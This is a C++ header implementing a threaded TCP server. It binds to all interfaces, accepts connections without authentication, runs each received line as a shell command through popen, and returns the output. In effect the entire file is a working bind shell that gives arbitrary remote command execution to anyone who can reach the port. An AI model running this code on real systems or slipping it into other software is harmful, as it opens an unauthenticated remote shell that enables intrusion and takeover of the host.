#pragma once

#include <iostream>
#include <string>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

using namespace std;


// Send all data to the client
bool send_all(int socket, const char* data, size_t len)
{
    size_t sent = 0;

    // Continue sending until all data is sent
    while (sent < len)
    {
        ssize_t bytes = send(socket, data + sent, len - sent, 0);

        // Return false if sending fails
        if (bytes <= 0)
            return false;

        // Update the number of bytes sent
        sent += bytes;
    }

    return true;
}


// Handle a single connected client
void handle_client(int client)
{
    char buffer[1024];

    // Keep receiving commands from the client
    while (true)
    {
        int bytes = recv(client, buffer, sizeof(buffer) - 1, 0);

        // Stop if the client disconnects or an error occurs
        if (bytes <= 0)
            break;

        // Add null terminator to the received data
        buffer[bytes] = '\0';

        // Convert received data into a string
        string command(buffer);

        // Close the client connection if EXIT is received
        if (command == "EXIT")
            break;

        // Check if the command is a cd command
        if (command.rfind("cd ", 0) == 0)
        {
            string path = command.substr(3);

            // Change the current working directory
            if (chdir(path.c_str()) != 0)
            {
                const char* error = "cd: cannot change directory\n";

                // Send the error message to the client
                send_all(client, error, strlen(error));
            }
        }
        else
        {
            // Add stderr redirection to the command
            string full_command = command + " 2>&1";

            // Execute the command and open a pipe for reading its output
            FILE* pipe = popen(full_command.c_str(), "r");

            // Check if the command could not be executed
            if (!pipe)
            {
                const char* error = "popen: failed\n";

                // Send the error message to the client
                send_all(client, error, strlen(error));
            }
            else
            {
                // Read command output from the pipe
                while (fgets(buffer, sizeof(buffer), pipe))
                {
                    size_t len = strlen(buffer);

                    // Send the command output to the client
                    if (!send_all(client, buffer, len))
                    {
                        pclose(pipe);
                        close(client);
                        return;
                    }
                }

                // Close the pipe after reading all output
                pclose(pipe);
            }
        }


        // Marker used to indicate the end of the response
        const char* END = "<END>";

        // Send the end marker to the client
        if (!send_all(client, END, strlen(END)))
        {
            break;
        }
    }

    // Close the client socket
    close(client);
}


// Start the server
void start_server(int port)
{
    // Create the server socket
    int server_socket = socket(
        AF_INET,
        SOCK_STREAM,
        0
    );

    // Check if socket creation failed
    if (server_socket < 0)
    {
        perror("socket");
        return;
    }


    // Allow the server to reuse the socket address
    int opt = 1;

    setsockopt(
        server_socket,
        SOL_SOCKET,
        SO_REUSEADDR,
        &opt,
        sizeof(opt)
    );


    // Configure the server address
    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);


    // Bind the socket to the specified port
    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind");
        close(server_socket);
        return;
    }


    // Start listening for incoming connections
    if (listen(server_socket, 5) < 0)
    {
        perror("listen");
        close(server_socket);
        return;
    }


    // Continuously accept new clients
    while (true)
    {
        sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);

        // Accept a new client connection
        int client = accept(server_socket,(sockaddr*)&client_addr,&client_len);

        // Check if accepting the connection failed
        if (client < 0)
        {
            perror("accept");
            continue;
        }

        // Create a separate thread for each connected client
        thread(handle_client, client).detach();
    }


    // Close the server socket
    close(server_socket);
}
